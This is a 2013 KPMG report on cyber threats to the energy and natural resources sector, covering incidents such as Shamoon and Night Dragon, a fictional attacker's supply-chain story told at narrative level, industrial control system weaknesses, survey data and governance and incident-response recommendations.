<doc>
<cover>
KPMG GLOBAL ENERGY INSTITUTE


<heading>Energy at risk</heading>
A study of IT security in the Energy
and Natural Resources industry

kpmg.com/energyaspac
</cover>

<section>
<heading> EXECUTIVE SUMMARY</heading>
Companies now not only face cyber attacks from hacking groups, script kiddies and hactivists, they are also threatened by state-sponsored agencies with limitless resources.These agencies usually carry out cyber attacks to seek a competitive edge, gain access to intellectual property, or for sheer sabotage.In other words, cyber threats have never been more pervasive and attack damages never more real.The situation is especially grim for the Energy and Natural Resources (ENR) industry.The sector is plagued by two key problems.For one, top management has traditionally not placed sufficient emphasis on information security.Also, much more focus is placed on connectivity compared to security.As a result, the ENR sector has become an enticing and relatively easy target for cyber attacks.As evidenced in recent cyber incidents “Shamoon<fn>1</fn>” and “Night Dragon<fn>2</fn>”, the resultant loss and combined damage, be it substantial or intellectual, would be far greater than the cost of preventive security measures.In this increasingly insecure environment, senior management should refresh their perspective to safeguard their key corporate assets.For many organisations in the Asia Pacific, a cyber security-oriented structural transformation might be necessary.</section>

<section>
“I am convinced that there are only two types of companies: those that have been hacked and those that will be.And even they are converging into one category: companies that have been hacked and will be hacked again.”
Robert S. Mueller, FBI Director
RSA Cyber Security Conference
March 2012
</section>


<footnote>
 1 Shamoon, also known as Disttrack, is a modular computer virus discovered in 2012 that attacks computers running the Microsoft Windows "NT" line of operating systems.The virus is being used for cyber espionage in the energy sector.Its discovery was announced on 16 August 2012 by Symantec, Kaspersky Lab, and Seculert.2 Operation Night Dragon was a Cyber Attack against energy companies which was exposed by the security company McAfee.Night Dragon attacks are designed to steal sensitive data from targeted organisations.Unlike opportunistic attacks, the perpetrators appear to be sophisticated, highly organised, and motivated in their pursuits.Compared to the past when criminals used a scattergun approach, cyber attacks now are much more focused and intelligent.Let us first take a peek into an attacker’s world.</section>

<section>

<heading>An attacker’s perspective</heading>

Understanding the perspective of an attacker is essential for everyone involved in fighting cybercrime.For that reason, staff in KPMG Netherlands interviewed one of their professionals – an ‘ethical hacker’.He relayed us an intriguing fictitious story.It is up to you to judge how realistic this threat would be to your organisation.“My employer insists on remaining anonymous, but rest assured, he is quite resourceful.He approached me a few weeks ago with a job offer.The goal he set was quite ambitious: steal as many secrets from the government as you can.Let me tell you about the steps I took.First, I sat down to think about what I knew about the government’s IT infrastructure.At a conference last fall, I had met an IT director of a ministry who had told me that all firewalls for the government were supplied by the same vendor, company Y. Hacking such a firewall was a formidable task - not something I was ready to take on directly.Instead, I took a more indirect approach.I logged in to LinkedIn and searched for employees of software development companies who mentioned company Y as one of their clients on their LinkedIn profile.Many professionals mention prestigious client names in their profile, even when company policy prohibits name dropping.Shortly after, I found multiple software vendors which make niche software and listed company Y as a client.I visited the vendors’ websites and scanned their externally reachable IP addresses until I found one which had an unpatched vulnerability in their web server: company X.After a day’s work, I was inside their network.Company X is a small organisation and they do not feel they need network segmentation, so I was able to reach all machines on their internal network through that web server.After some more work, I was able to elevate my privileges to domain administrator, which meant I had full access to all of their systems.This was where I hit a bump.I intended to change the source code of their product in such a way that it would allow me to connect remotely to the system of anyone who installed it, but I had never done that before.I then decided to log on to a hacker forum and posted a request for help.I offered 10,000 euros reward for a job well done.After a while, I was approached by someone who was willing to help me.I asked around to confirm his reputation in this field.I enlisted his help in modifying the source code of the main product of company X.The security policies of company Y were very strict: only the system administrators can install software on the workstations, and both incoming and outgoing traffic goes through a proxy server.Luckily, the virus which my associate hacker had written communicates through DNS, which was not actively monitored or filtered.The software from company X was updated on a regular basis, and after three weeks I received a message which indicated that I had access to their workstations.I called on my associate hacker once more, but this time for a more advanced task: reprogramming the firmware of the firewalls which company Y produces.He indicated that he needed the help of a contact who installed a backdoor in all firewalls for another 20,000 euros.Now, all I needed to do was wait for the next update of the firmware.I posted some fake security vulnerabilities for the current version of this firmware, to ensure that the firmware would be upgraded timely.And slowly but surely, I gained access to all internal networks of the government.I could then route any traffic which flows through any government network through my own computer.I can also read all emails which are sent between government employees internally.I can find vulnerable servers by scanning the networks.In almost all the internal networks, I have found at least one server which I can exploit.I installed backdoors on hundreds of workstations which allows me the ability to monitor email servers, so emails with interesting attachments can be forwarded to me.Additionally, I have obtained login credentials for almost all major government databases.Every day, almost two hundred gigabytes of government secrets are sent to me automatically.This amount is only limited by the amount of bandwidth I can get, and the number of hard disk drives I install.I’m being paid 100 euros per gigabyte of information.I will leave it to you to calculate my hourly wage.” </section>

<section>
The sad truth is that cybercrime is here to stay.A report by the Government Accountability Office indicated that 24 key government agencies in the United States have logged a 650 percent increase in cyber security incidents in 2011 compared to five years ago.According to a survey by KPMG Netherlands, 49 percent of organisations have experienced some form of cybercrime activity during the past 12 months while the remaining may not even have proper detection measures in place.Among the 49 percent, 10 percent indicated that they have been attacked more than 100 times within the past year.The remaining respondents said they were attacked successfully up to five times last year.Most of the incidents were not covered by the media and are therefore not publicly known.Information leakage most common Globally, information leakage is one of the most common challenges faced by organisations.Opening an email containing a virus from a hacker can allow perpetrators to seize control of your computer, read your emails and record your passwords.Information leakage is in fact one of the most common types of incidents across the world and can easily take place in your daily life.Take for example that you have made a donation to a local charity.In recognition of your contribution, the organisation lists your name on their website as a sponsor.Two days later, you receive an email from the Fundraising Chair asking you to confirm your donation.You open the email, fill out the form (you are also careful not to include any banking or sensitive information) and return it to the sender.But in reality, the email didn’t come from the charity at all; the attachment was, in fact, a high quality fake containing a virus, allowing perpetrators to seize control of your computer, read your emails and record your passwords.Everything you know or see is now visible to the perpetuators.Clearly, information leakage is rapidly becoming a board-level risk.A 2012 survey by KPMG suggest that more than three-quarters of the Forbes 2000 companies leak potentially dangerous data (See Figure 1 below).Personal information and financial data are often lost due to hacking,system failure, human negligence and disgruntled employees.Some countries have already enacted legislation to curb such problems.The European Commission’s General Data Protection Regulation released in 2012 states that companies have the obligation to protect their network and personal information.Companies must also authorities within 24 hours after a serious breach, or face a penalty of up to one million Euros or two percent of turnover.It is worth noting that hacktivist groups are often the agents responsible for information leakage.For instance, members of “Anonymous”, a famous hacktivist group, are not only known for bringing down commercial systems and websites, they have also infiltrated into commercial organisations’ computer systems, exposing correspondence and personal data to the public in the process.In 2010, Anonymous penetrated Sony’s network and cost the latter US$170 million dollars in reparation for the unauthorised disclosure of customers’ names and credit card numbers.Another Anonymous’ affiliate group AntiSec dumped over 860,000 user credentials including 75,000 sets of personal and financial information into the open Internet after breaking into the firm Stratfor’s systems.During the past few years, industries all around the globe have witnessed for the first time carefully engineered and profoundly complex attacks such as Stuxnet, Night Dragon and Shamoon (these will be described later in the document).Cyber security has become a grim issue that no one can avoid.<figure>
 <caption>Figure 1: Heat map of information leaking countries</caption>
 Very hot Hot Warm
Source: KPMG Cyber Vulnerability Index 2012
</figure>
</section>

<section>
<heading>ENR Related Security Incidents</heading> 
		 
<heading>General</heading> 
Of all the potential marks at crosshair, the ENR industry is one of the most attractive targets for cyber criminals.According to the United States (US) Department of Homeland Security News Wire published in April 2012, American water and energy companies deal with a constant barrage of cyber attacks on a daily basis.These incidents usually take the form of cyber espionage or denial-of-service (DoS)<fn>3</fn> attacks against the utilities’ industrial-control systems.According to a survey report released by The Centre for Strategic and International Studies in 2010, “critical infrastructure firms such as power grids, industrial control networks and oil refineries are facing staggering level of cyber attacks, and are not adequately prepared to defend themselves”.In April 2012, the US Cyber Security response team warned of attacks upon the gas industry.The Industrial Control Systems Cyber Emergency Response Team (ICS-CERT) reported a number of cyber intrusions targeting gas pipeline companies.Analysis of the attacks confirmed they are part of an ongoing campaign dating back to December 2011 and indicated Spear Phishing was used to target a number of specific individuals across the gas pipeline industry.</section>

<section> 
 Spear phishing is an e-mail spoofing fraud attempt that targets a specific organisation, seeking unauthorised access to confidential data.</section>

<section> 
<heading>Shamoon</heading> 
On 15 August 2012, Saudi Aramco, a large national oil and gas company with global operations, announced that they had to disconnect their IT systems from the Internet while dealing with a serious disruption of their network.The disruption, which continued for two weeks, was the result of a cyber attack that used a computer virus to disable over 30,000 of the company's workstations.The virus, later named as “Shamoon”, was the first significant cyber attack on a commercial target to cause real damage.It is also the most destructive attack the private sector has experienced to date.Later in the same month Rasgas, a main player in the Qatari Liquid and Natural Gas scene, was also hit by the Shamoon (as per security experts) virus and consequently forced to bring their entire network offline.</section>

<section> 
<heading>Night Dragon</heading> 
Another series of cyber incidents in the ENR sector were dubbed collectively by security company McAfee as “Night Dragon”.McAfee believes that these attacks on global oil, energy and petrochemical companies may have started as early as in 2007.Evidence from McAfee has shown that this series of well-coordinated and specifically focused attacks involve a myriad of different techniques and methods.The primary target seems to be any financial information related to bids and oil-and-gas operations.McAfee also pointed out that all the attacks took place regularly during weekdays from 9am to 5pm in GMT +8 time zone, which matched with the source location as determined by the IP address, thus pointing at the high possibility of “company men” being hired to perform the job systematically.</section>

<section> 
<heading>Others</heading> 
There are many more cyber security incidents which have taken place in the ENR industry.In 2011, a Canadian-based company which supplies remote administration and monitoring tools to Fortune 100 energy companies reported that it had suffered a security breach.Upon breaching the corporate network, the attackers installed malicious software on computers and stole information related to a remote administration tool which the company supplies.Another incident of more recent times occurred in early 2013.In February 2013, the US Department of Energy confirmed that computers and servers at its Washington headquarters were compromised in the previous month.In this attack, personally identifiable information of several hundred employees and contractors may have been compromised.Seemingly non-critical at first glance, this information may however be used to further future attacks into having serious consequences.In another case, unidentified hackers helped a manufacturer in China obtain the breakthrough design of a wind turbine by an energy company in the United Kingdom.The Chinese manufacturer subsequently made and sold the product at a much lower price, driving the original company in the UK into closure.DoS attacks represent yet another form of cyber security attacks which cause huge financial losses and massive damage to companies in the ENR sector.A report published by McAfee in 2011 stated that four out of every five oil, gas and power companies have suffered at least one DoS attack in 2011.Cyber attacks are also increasingly escalating into cyber warfare.In an October 2012 Wall Street Journal article, U.S. officials noted that “Iranian hackers with government ties have mounted cyber attacks in 2012 against American targets, escalating a low-grade cyber war ...The Iranian effort culminated in a series of attacks against U.S. banks as well as electronic assaults on energy companies in the Persian Gulf.”

These incidents clearly show the increasing severity of cyber attacks and give an idea on how important cyber security will be in the future.</section>

<footnote>
3 A denial-of-service (DoS) attack or distributed denial-of-service (DDoS) attack is an attempt to make a machine or network resource unavailable to its intended users.s
</footnote>

<section>
<heading>Overview of Major Problems</heading> 
 
The obvious question to ask is why these various organisations are so vulnerable in the face of cyber attackers.In 2012, Carnegie Mellon University conducted their yearly survey for largest American companies.The results indicated that more than 70 percent of C-Suite executives and members of the board are not actively involved in the protection of their company data.They are also rarely involved in the inspection of key employees working on information security or the revision of corporate-wide policies in this aspect.A similar trend has been observed by the Government Accountability Office in American government agencies.Despite receiving numerous security recommendations each year, companies were not implementing these properly.Key personnel were also not being trained adequately.In addition, there is a lack of proper monitoring on security controls or appropriate key performance indicators to assess improvement.The ENR sector is critical as it powers the growth of almost every economy in the world.The sector can be broadly divided into three categories: electricity, petroleum and natural gas.In the electricity category, both automation systems and utilities controls of electricity infrastructure are built on a complicated system known as the Supervisory Control and Data Acquisition (SCADA).Similarly, the production and distribution of petroleum and natural gas are heavily dependent on systems similar to SCADA.Unfortunately, such industrial infrastructure control systems have been facing a severe legacy problem in recent years.They have been rashly connected to the Internet for remote accessibility without implementing adequate security measures.This has in turn led to higher chances of such systems falling prey to cyber attacks.</section>


<section>
<heading>The who & why of cyber attacks</heading>

In this era of information and connectivity, malicious hackers are able to easily find information assets as targets in a corporate network.What is at stake is financially valuable data such as mergers-and-acquisitions plans, transaction records, quarterly/annual reports and internet banking details.Strategic information including intellectual property, contact details of senior executives, records of legal disputes and various trade secrets are also at risk.In addition, personal data like employees’ addresses and date of birth, once compromised might very well be used in facilitating identity theft.Last but not least, process control networks are being increasingly favoured by attackers given their vast potential in bringing about significant impact, as proven in the famous Stuxnet case<fn>4</fn> and other incidents described earlier.Given how the numerous production and exploration activities carried out by energy companies are dependent on these networks, this trend is of particular relevance and importance to the ENR sector.A 2011 report by KPMG has shown that oil and gas operations are amongst the top 10 sectors which suffer from the most information leakages worldwide.Information leakages involving oil and gas operations account for six percent of all security incidents.Some of the sources of leakage are within the direct control of the corporation and can be prevented if companies put in the effort.These sources include websites, documents and web servers.However, there are also other channels such as popular search engines and forums which are outside of the usual enterprise security curtain and pose a much more complex challenge.The KPMG report also revealed that 78 percent of Forbes 2000 corporate websites leak some form of potentially useful information through their document meta-data.</section>

<section>
 Document meta-data is information ‘about’ a document, or information on its properties.It often informs who created a document, when and where on a device or network.</section>

<section>
According to version information retrieved from document meta-data, 71 percent of the 2000 companies may be using potentially vulnerable and out-dated versions of Microsoft and Adobe software.Furthermore, 16 percent of corporate web servers may be vulnerable to attack due to missing security patches or out-dated server software.Many instances of un-patched and unsupported web server software were found to be serving Forbes 2000 corporate websites.<figure> <caption>Figure 2: Number of potentially sensitive</caption></figure>
</section>

<footnote>
4 Stuxnet is a computer worm discovered in June 2010 that is believed to have been created to attack Iran's nuclear facilities.Stuxnet initially spreads via Microsoft Windows, and targets Siemens industrial software and equipment.Kaspersky Lab concluded that the sophisticated attack could only have been conducted "with nation-state support".Different variants of Stuxnet targeted five Iranian organizations, with the probable target widely suspected to be uranium enrichment infrastructure in Iran 
</footnote>
<section>
Part of KPMG’s research focused on the structure of the Forbes 2000 corporate websites to identify any potentially sensitive file locations or hidden functionality that may be useful to cyber attackers.A number of file locations marked ‘private’ were also identified, hosting documents that were not intended for public consumption (See Figure 2 below).The direct result is that out of all the servers used for corporate websites, 15 percent offer hacker access to test functionality and private login portals that potentially allow file upload capabilities that could likely lead to full take-over of servers by cyber attackers.Oil & Gas operations have also emerged in the list of top 10 sectors that post most information to public forums and newsgroups.There are as many as 88,681 of such postings in newsgroup alone, according to the report.If past experience has taught us anything, it is that cyber attackers and organised crime do not target one avenue of attack.Instead, they use a combination of available information leaks to profile a target, and map out the target’s internal systems and their components.It is important to emphasise that the processes used to gather the information leaks mentioned above are not sophisticated and available to anyone with access to the Internet and little more than a web browser.<figure><caption>file locations on the Forbes 2000 corporate websites by sector</caption></figure>

</section>

<section> 
<heading>Industrial Control System </heading>

The problem is even worse when it comes to control systems which are widely adopted by ENR industries, as explained by chief cyber security strategist from Computer Sciences Corporation (CSC ), Donald Purdy.Purdy, formerly a cyber official at the Department of Homeland Security, mentioned during a major security conference in San Francisco in 2012: 
 
“These are older systems so they are harder to control.And for convenience and cost savings, people have connected them to the internet in order to control them from remote locations.So this is almost a perfect storm in terms of vulnerability because the nation is so dependent on these systems… This is a significant security issue for the United States and frankly for the world.” 
 
In the monthly monitor report released last September by the US Industrial Control Systems Cyber Emergency Response Team (ICS-CERT), it was also mentioned that “the positive aspects of better connectivity were overshadowed by the introduction of significant vulnerabilities”.For instance, Justin W. Clarke, a 30-year-old cyber security researcher and electric utility expert discovered two major vulnerabilities in 2012 on Siemens’ RuggedCom equipment which is extensively used by companies in communicating with power stations situated in different locations.The first vulnerability is essentially a secr “back door” which would easily allow hackers remote access into the equipment.The second vulnerability makes it possible for hackers to intercept the network traffic between operator and devices which may contain authentication credentials.Potential attackers could take advantage of such flaws to manipulate power stations or use these flaws to launch another set of attacks on a much larger scale.The situation is made even worse when independent researchers release and circulate system flaws and vulnerabilities for reference and countermeasure studies.While the intention behind such documents might be good, the direct consequence is that many could now easily gain access to dangerous and powerful “weapons” such as the code of Stuxnet, which can cause immense damage to critical infrastructures.In contrast to the published vulnerabilities, certain manufacturers of critical system controllers are reacting way too slowly which have resulted in research groups like Digital Bond, releasing exploits for these vulnerabilities in order to “stimulate” the patching and upgrading efficiency.When it comes to electrical power, technology is also a double-edged sword.While advances in smart grid technologies have helped better detect power theft and reduce power loss with smart meters been recently deployed in countries such as in Serbia and Brazil, these technologies also give rise to possibilities of their advanced functionalities being used for shady purposes.For instance, two demonstrations at Security B-Sides and Black Hat conferences illustrated that hackers could basically tweak the smart metres currently in use to perform functionalities as they wish, which include changing of temperature, controlling of lighting and even cutting of power during emergencies.As a side note on corporate security policies and procedures, the Saudi Aramco incident where large number of business computers were disabled, also highlighted importance of monitoring network attacks initiated by inside personnel and the potential danger of using portable storage media like thumb drives.<heading> Categorised Active Players </heading>
 
 Over the years, two major shifts in trends have been observed in terms of cyber attacks.Firstly, the targets are shifting from individual organisations to chains of related companies.Secondly, the main components of attackers have shifted from script kiddies to criminal groups, with the latter being much more specialised and coordinated.Just as attacks have evolved, companies too must evolve by re-evaluating their own ability to detect, defend and respond to cyber attacks.<figure></figure>
</section>

<section>
<heading>Various Attack Vectors</heading> 
 
Cyber incidents can be loosely divided into three categories.The first category is accidental events due to human error, system failure or unanticipated accidents.The second category refers to unauthorised access into networks and systems by hackers or employees.The third category does not require actual access as it usually causes denial of service or loss of data.Attack methods could involve complicated and coordinated efforts to beat the cyber security protection mechanism and intelligence reconnaissance, followed by social engineering techniques for acquiring of target information.There are six most common types of security failings.These are shared accounts, weak passwords, lack of effective network monitoring, lack of effective Web monitoring, absence of logging and absence of log analysis.Lack of user awareness also provides more opportunities for social engineering attempts to succeed.Examples of such attempts include luring Internet users into execution of malware and Spear Phishing.(See Figure 3 below).A group of attackers who are particularly good at social engineering is Anonymous.These hackers typically exploit easy-to-guess passwords of users or use emails to trick users into revealing confidential information or into clicking links which lead to the download of malicious software.However, Anonymous is not the only group of people who are familiar with this technique.In fact, cyber criminals and state-sponsored attackers have been practising it for a far longer time.The stakes are also bigger for them as they stand to gain a whole lot more of important information.Eddie Schwartz, chief security officer of the security firm RSA summed it up best during a security conference in San Francisco in 2012 when he said: “The attacks by them (Anonymous) pale in comparison to the nation-state stuff and the criminal element… The more eyes, the greater chance of success (for an attack)”, which accurately depicts thecyber environment nowadays.<figure>
 <caption>Figure 3: Methods of attack</caption>
 %
 30
 28.7

 25
 23.3

 20

 16.7
 15
 14.7

 11.3
 10


 5.3
 5



 0
 Compromised Infection Phishing Social Unknown Other
 web with engineering
 applications malicious
 malware
</figure>

Source: 2012 KPMG paper "A nuanced perspective on cybercrime".</section>

<section>
<heading>Impact on companies who fall prey to such attacks</heading> 
 
The objectives of cyber attacks can be divided into two distinct categories.These are 

•	 misappropriation and theft of intellectual property, financial data or other confidential information for monetary gain or to gain a competitive edge; 
 
•	 corruption or disturbance of key business assets and processes for strategic purposes or to make an activism statement, 

However, the actual impact on victim companies could be much broader and more profound.More specifically, direct consequences of such attacks comprise disruption of business and production processes, unauthorised access to monetary operation, loss of intellectual property, disclosure of merger-and-acquisition deals, identity theft and compromising of customer data.Such attacks can also adversely affect third party partners in the industrial chain.(See Figure 4 below).But all the above consequences are just the tip of the iceberg.Deeper financial and reputational impact further includes loss of competitive advantage in accessing new fields, failure to keep current clients and investors, losing deals and disputes (or winning them on
unfavourable terms), regulatory fines, liability lawsuits, share price drops, costs involved in fixing business relationships and even negative international publicity.In addition, the company would very likely be forced to spend more than usual to fix systems and repair damages.It is also very likely that costly fees will be incurred from services of third party experts and consultants for mitigation and recovery services.There could also be forced expenditure on personnel change, organisational restructuring and additional training.<figure>
 <caption>Figure 4: Purpose of attack</caption>
 %
 30.0
 30




 25




 20

 16.6 16.1
 15 14.6
 12.1
 10.6
 10




 5




 0
 Access to Access to Disruption Obtaining Obtaining Other
 money third party of business information information
 information and concerning concerning
 or systems production intellectual mergers &
 processes property acquisitions


</figure>

 Source: 2012 KPMG paper "A nuanced perspective on cybercrime".</section>


<section>
<heading>How companies can cope</heading>

<heading>The need for action</heading>

However, effective awareness requires continuous effort to remain vigilant.In this aspect the financial institutions seem to be doing a better job in understanding the potential “enemy” compared to the other industries, including the ENR sector.The Obama administration submitted a cyber security proposal to Congress last May to outline its priorities for cyber security and to press lawmakers to pass comprehensive legislation to protect critical U.S. infrastructure that powers the Internet, utilities, and other control systems that are vulnerable to attack.Feds Simulate Crippling Cyber security Attack On NYC Electricity [March 2012] 

Advances in technology and mounting concern about the potential for a cyber attack to damage power stations, water-treatment plants and other critical systems have prompted senior officials to seek a more robust role for the department’s Cyber Command.For one thing, cyber attacks can take place in milliseconds.The assailant may be unknown.The attack route may be hard to trace, crossing multiple countries.Pentagon proposes more robust role for its cyber-specialists [August 2012] 
 
Iran is to move key ministries and state bodies off the worldwide internet next month in an effort to shield them behind a secure computer wall from disruptive cyber attacks like the Stuxnet and Flame viruses.“The establishment of the national intelligence network will create a situation where the precious intelligence of the country won't be accessible to these powers.”

Iran to unplug from Web to escape ‘Internet monopoly’ [August 2012] 

The key is to be able to understand the motives behind a cyber attack.It must be made clear the cyber world is no longer playing in the “minor league”, but rather the “major league” with players who potentially have access to unlimited resources and endless patience in achieving an aforementioned objective.On a second note it is extremely necessary to conduct thorough analysis of risks and have a clear understanding of the different asset value perception.What seems of little value to one firm might be worth a lot more to attackers who have a totally different perspective or who are planning an attack on a chain of companies.As a result, consideration should be given to the relationship between the costs for implementing detective controls and costs of incidents.The latter should include indirect damages incurred on consumer confidence and reputation, the two most valuable assets of a company.A 2012 survey titled ”A nuanced perspective on cybercrime” which was conducted by KPMG in Netherlands, stated that out of the 170 responding organisations under various sectors including ENR, approximately 19 percent of them spend more than 1.5 million euros on cybercrime prevention, detection and response per year.Thirdly, whether short term measures or long term controls have been implemented, the upper management of companies should never be complacent and believe that they enjoy 100 percent security.The IT landscape in many modern organisations is simply often too complex for complete protection.The same 2012 KPMG survey also revealed that 45 percent of companies experienced attempts of cybercrime attacks in 2011.In addition, 55 percent of respondents were unsure of whether they can effectively respond to a cybercrime attack, and only 20 percent said they can respond effectively to an attack but unfortunately do not have an attack response plan in place.Among all the responding corporates, approximately 30 percent have forensic capabilities as a control and only 55 percent have central incident and event monitoring capabilities.Most importantly, it is vital for the management to set the correct tone.KPMG's experience with clients has shown over and over again that security is largely a management issue.The survey also showed that more than 75 percent of respondents believe that fighting cybercrime goes beyond installing the needed technology to curb it.Some 90 percent of them also agree that cybercrime should be discussed at the board level.</section>

<section>
<heading>So are companies in the ENR industry up to the challenge?</heading>
 
Most respondents from the ENR sector of the same KPMG survey do not think so.They believe that hackers are more likely to win in this sector compared to other industries.If a company does not consider itself to be ready, actions must be taken.Management should endorse prevention efforts and start seeking a structured approach.There also has to be effective use of security monitoring and seamless cooperation between the different parties involved so that knowledge and expertise can be shared among government, business communities, IT security groups and even cross-border organisations.Beyond the prevention of incidents, timely detection and an adequate response are also critical.If there is any major gap or deficiency in the policies, procedures and tools of a company, the worst time to discover these would be when a cyber security incident is already set on its course.In terms of short-term actions, the company could perform risk analysis from the perspective of an attacker, identify and monitor critical assets as well as begin implementing a standby incident response team.In the long run, companies should strive for cost-effective control of the cyber environment by addressing the domains of people, processes and technology.Yet, even the most comprehensive security control system cannot guarantee the complete prevention of cyber incidents.An incident response plan and an emergency action plan is therefore also of paramount value in the proper handling of a security compromise and reducing the subsequent damage.If a thorough and detailed plan is not available, the very least an organisation should do is to be familiar with some basic concepts and simple primary actions to respond to an incident.(See Figure 5 below).This helps the company achieve more effective business resilience, which is important especially for the protection of the most critical assets.</figure> 

</section>

<section>
<heading>Suggested frameworks</heading>
 
Given the shifting perspective of the defence against cybercrime, a more modern approach to cyber security therefore also focuses on the perspective of the criminals.In terms of risk assessment, the organisation must not only consider itself as an attractive end target, but also consider its part in the supply chain.It should also not view itself as one entity that should be protected, but as a collection of processes, users and IT infrastructure.Companies should focus on being well informed of (the character) of possible threats and invest in a proper defence.They should not do this in an isolated way, but rather use the knowledge and experience of colleagues in both the public and private sector.A joint response is essential for protection against cyber espionage, terrorism, crime and disruption of information and communication systems.<heading>ICS-CERT Recommendation</heading>
 
With respect to the industrial control system, ICS-CERT<fn>5</fn> suggests a proactive security model as depicted in the Figure 6 below.This model can be further complemented with a more detailed five-step approach in protecting information and records:
 
• Obtain executive sponsorship, establish a team, and determine the team's goal, objectives, and milestones - ensuring that these efforts are aligned with the goals of the business.• Develop a training and awareness campaign.Policy content should be comprehensive, consistent and implemented with process changes and the introduction of appropriate controls and metrics to measure effectiveness and compliance.• Assess the current state of the organisation's information protection efforts.Classifying the sensitivity of information should be a key goal.• Design the desired state of information integrity protection, with the goal of establishing improved handling and protection practices that achieve policy requirements, lower business risk, and increase productivity.• Implement the desired state.Enhanced process and data workflows, controls, and processes are a key outcome.The result is a programme that helps leaders ensure the risk-based protection of information assets.<figure>
 <caption>Figure 6: Proactive Security Model</caption>


 Map Architecture Risk Assessment

 Training Digital Asset ID

 Proactive Security Model

 Incident Response Profile Model

 Standardise Policies Identify/Remove Vulnerabilities

</figure>
</section>

<footnote>
5 The Industrial Control Systems Cyber Emergency Response Team (ICS-CERT) is part of the US Department of Homeland Security (DHS) and works to reduce risks within and across all critical infrastructure sectors.</footnote>

<section>
<heading>Real life case studies</heading>

There have been quite a few cases worldwide where KPMG applied the use of frameworks and helped different clients with their needs in achieving the goal of cyber security.</section>

<section> 
In the Dutch market, joint efforts of the financial sector are pretty successful in boosting awareness.Aside from cooperation between financial institutions and the Government, KPMG also actively shares experiences as part of the focused joint efforts.Generally, there are three types of security controls: prevention, detection and response.</section>

<section> 
KPMG in the Netherlands provides the banks with an update on the trends in cybercrime threats and potential solutions twice a year.KPMG employs a global network of hundreds of information security specialists, which reaches virtually all major financial institutions worldwide.Attack patterns observed at other banks and solutions applied by these institutions help to shape an image of upcoming attacks and solutions relevant for Company B.Knowledge of the latest cybercrime attack trends and defence measures helps Company B to update the bank’s defences on time in order to adequately respond to attacks.</section>
 
<section>

In general, preventive controls are more popular than detective controls whereas detective controls are used
more often than responsive controls, as in this case of how KPMG helped a company in the ENR industry.However, as discussed earlier, incidents cannot be avoided 100 percent of the time.This implies that detection and response are equally important and are thus the areas with the biggest room for improvement.</section>

<section>
Company Z is a well-known company in the oil, gas and natural resources industry.KPMG firms’ teamed with a technology partner provider to supervise one of the largest global implementations of a security monitoring platform.The platform correlates information about thousands of security events from numerous systems spanning across the globe.A list of the most relevant cybercrime risks for Company Z was drafted in close cooperation with the organisation.For each risk, a set of detection rules was defined.The ability to adequately respond is mainly achieved by properly established processes and governance.KPMG advised on governance structure, engineered new incident response processes and established training programmes for security personnel.<figure></figure>
</section> 

<section>
Below is another example illustrating  KPMG’s experience in adequate and  systematic response after a security incident has taken place:
</section>

<section> 
 Company A was informed by a whistleblower that an attacker gained access to the company’s website and/or closed environment.In response to this news the website was taken offline and KPMG was asked to assist.• A collaboration of Forensic technology and IT security experts captured forensically sound images of the most critical servers to make sure no traces or evidence were lost.• The images were analysed for traces in system files and properties, logs from firewalls were secured and analysed, KPMG also analysed all traffic to and from the compromised servers.• The analysis showed that the perpetrator succeeded in creating and uploading several files to the web server that contained malicious code, allowing the perpetrator to send commands to the server from a remote location.• KPMG helped the client by implementing remedial procedures and additional security measures, thus mitigating the risk of further damage and bad publicity.</section>

<section> 
Even if it is within an organisation itself, one way of improving the handling of specific cyber incidents related to industrial control systems would be to gather a group of staff to conduct brainstorming and collaboration exercises 

During such sessions, staff from various departments will get to receive more adequate cyber security training, initiate effective inter-departmental interactions, and update antiquated policies and procedures.They can also get to identify and fix any security flaws found in the system, so as to create a corporate and organisational environment that is more resistant to cyber attacks.</section>

<section>
<heading>Conclusion</heading>
The battle against cyber crime is one which is difficult to win.From the perspective of the Asia Pacific region, we understand that data security is not an easy concept for most business leaders to fully grasp.In part, this is because many organisations do not have a clear view on the actual value of their data and as a result, tend to follow a one-size-fits-all approach to data security.At the same time, organisations in this region have also seen a gradual migration of their corporate value away from physical assets (such as facilities, products and people) towards digital assets (such as bid information, technology designs or customer data).Therefore, most businesses have robust crisis plans for events like floods, fires or sudden executive departures, but have very few for digital
security issues.An organisation in the ENR industry must stay as up-to-date as possible with security issues and set in place effective security measures.Beyond doing so, an ENR organisation must evaluate itself through the eyes of potential attackers so as to identify and protect parts which represent the highest substantial value.The importance of executive leadership and support in developing a data security strategy cannot be overstated.The risk of data loss should be a board-level issue and not a challenge isolated to the IT department and risk managers.This means that executives must not only ‘walk the walk’ when it comes to complying with protocols, but also actively participate in the development of security to ensure that the rules reflect the priorities of the business.Most importantly, executives must strive to institutionalise continuous improvement mechanisms to ensure that they learn from hard-earned lessons of the past.Should a cyber security transformation be undertaken, the five recommended objectives would be to Prevent, to Prepare, to Protect, to Remediate and to Integrate and Transform.However, given the scope and complexity of the challenge, it is not surprising that most executives are left wondering how best to approach the issue without dampening productivity or expending scarce resources.It is important that executives in the Asia Pacific region balance a cautious approach to IT security with the downside and damage that can be caused by the lack of being able to carry on business as normal and the loss of confidential and sensitive information.Member firms of the KPMG network of independent firms are affiliated with KPMG International.KPMG International provides no client
Page 17 services.No member firm has any authority to obligate or bind KPMG International or any other member firm vis-à-vis third parties, nor does KPMG International have any such authority to obligate or bind any member firm.2 http://sec.gov/divisions/corpfin/guidance/cfguidance-topic2.htm

INDUSTRIAL CONTROL SYSTEMS — http://www.us-cert.gov/control_systems/pdf/ICS-CERT_Monthly_Monitor_Apr2012.CYBER EMERGENCY RESPONSE TEAM : pdf
Monthly Monitor April 2012

INDUSTRIAL CONTROL SYSTEMS - http://www.us-cert.gov/control_systems/pdf/ICS-CERT_Monthly_Monitor_Sep2012.CYBER EMERGENCY RESPONSE TEAM : pdf
Monthly Monitor September 2012

Improving Industrial Control Systems http://www.us-cert.gov/control_systems/practices/documents/Defense_in_Depth_
Cybersecurity with Defense-in-Depth Oct09.pdf?html

U.S. looks into claims of security flaw in http://www.reuters.com/article/2012/08/22/ctech-us-cybersecurity-siemens-
Siemens gear idCABRE87L02F20120822

Iran to unplug from Web to escape West’s http://www.rt.com/news/iran-internet-intranet-security-938/
‘Internet monopoly’
</table>



<footer>© 2013 KPMG International Cooperative (“KPMG International”), a Swiss entity.Member firms of the KPMG network of independent firms are affiliated with KPMG International.KPMG International provides no client
services.No member firm has any authority to obligate or bind KPMG International or any other member firm vis-à-vis third parties, nor does KPMG International have any such authority to obligate or bind any member firm.html

